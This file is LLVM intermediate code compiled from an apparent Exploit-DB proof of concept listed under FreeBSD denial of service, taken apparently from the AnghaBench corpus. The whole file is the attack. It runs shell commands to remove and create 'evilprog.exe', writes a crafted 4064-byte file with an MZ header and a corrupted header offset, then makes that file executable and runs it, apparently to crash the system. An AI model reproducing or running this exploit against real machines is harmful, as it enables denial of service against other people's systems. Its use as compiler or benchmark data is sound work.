; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/dos/extr_9206.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/dos/extr_9206.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [40 x i8] c"rm -rf evilprog.exe; touch evilprog.exe\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"evilprog.exe\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [23 x i8] c"chmod 700 evilprog.exe\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"./evilprog.exe\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4064 x i8], align 16
  store i32 0, i32* %1, align 4
  %5 = call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %6 = load i32, i32* @O_WRONLY, align 4
  %7 = call i32 @open(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i32 %6)
  store i32 %7, i32* %3, align 4
  %8 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 0
  store i8 77, i8* %8, align 16
  %9 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 1
  store i8 90, i8* %9, align 1
  store i32 2, i32* %2, align 4
  br label %10

10:                                               ; preds = %17, %0
  %11 = load i32, i32* %2, align 4
  %12 = icmp slt i32 %11, 60
  br i1 %12, label %13, label %20

13:                                               ; preds = %10
  %14 = load i32, i32* %2, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 %15
  store i8 97, i8* %16, align 1
  br label %17

17:                                               ; preds = %13
  %18 = load i32, i32* %2, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %2, align 4
  br label %10

20:                                               ; preds = %10
  %21 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 60
  store i8 -18, i8* %21, align 4
  %22 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 61
  store i8 -18, i8* %22, align 1
  %23 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 62
  store i8 -18, i8* %23, align 2
  %24 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 63
  store i8 -18, i8* %24, align 1
  store i32 64, i32* %2, align 4
  br label %25

25:                                               ; preds = %32, %20
  %26 = load i32, i32* %2, align 4
  %27 = icmp slt i32 %26, 4064
  br i1 %27, label %28, label %35

28:                                               ; preds = %25
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 %30
  store i8 97, i8* %31, align 1
  br label %32

32:                                               ; preds = %28
  %33 = load i32, i32* %2, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %2, align 4
  br label %25

35:                                               ; preds = %25
  %36 = load i32, i32* %3, align 4
  %37 = getelementptr inbounds [4064 x i8], [4064 x i8]* %4, i64 0, i64 0
  %38 = call i32 @write(i32 %36, i8* %37, i32 4064)
  %39 = load i32, i32* %3, align 4
  %40 = call i32 @close(i32 %39)
  %41 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %43 = load i32, i32* %1, align 4
  ret i32 %43
}

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
